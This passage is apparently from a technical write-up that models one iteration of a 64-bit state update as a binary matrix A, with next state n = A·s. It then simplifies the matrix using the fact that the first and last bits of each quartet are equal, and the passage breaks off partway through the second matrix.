0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 \\newline 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\newline \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\newline 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} \\newline 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\end{pmatrix} $$\nIf we call this matrix $A$, we have this relation:\n$$ \\begin{pmatrix} n_{63} \\newline n_{62} \\newline \\vdots \\newline n_1 \\newline n_0 \\end{pmatrix} = A \\cdot \\begin{pmatrix} s_{63} \\newline s_{62} \\newline \\vdots \\newline s_1 \\newline s_0 \\end{pmatrix} $$\nWhere $n$ is the next state and $s$ is the current state within one iteration.\nWe can tweak this matrix knowing that the first and last bits of every quartet are the same, so $s_{63} = s_{60}$, $s_{59} = s_{56}$ and so on until $s_3 = s_0$:\n$$ \\begin{pmatrix} 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 